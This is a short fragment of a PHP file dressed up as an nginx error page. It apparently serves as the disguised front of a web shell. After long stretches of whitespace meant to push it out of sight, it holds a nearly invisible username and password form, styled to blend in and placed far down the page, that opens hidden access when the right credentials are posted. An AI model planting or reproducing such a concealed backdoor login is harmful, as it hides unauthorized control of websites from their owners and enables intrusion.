...
<hr><center>nginx</center>
																																																																		...
																																																																		<style>input[type=text], input[type=password] {width: 9%;padding: 2px 4px;margin: 2px 0 0px 0;display: inline-block;border: 0px solid #ccc;box-sizing: border-box;padding-top: 0px;font-size: 13px;color:black;}.kodak {margin-top: 563px;}</style><div class="kodak" align="right"><form action="" method='post'><br><input type="text" style='color:#B4B4B4' placeholder="." name="username" id="username"><br /><input type="password" style='color:#B4B4B4' placeholder="." name="password" id="password"><input type="submit" name="submit" hidden /></form></div>
<?php } ?>
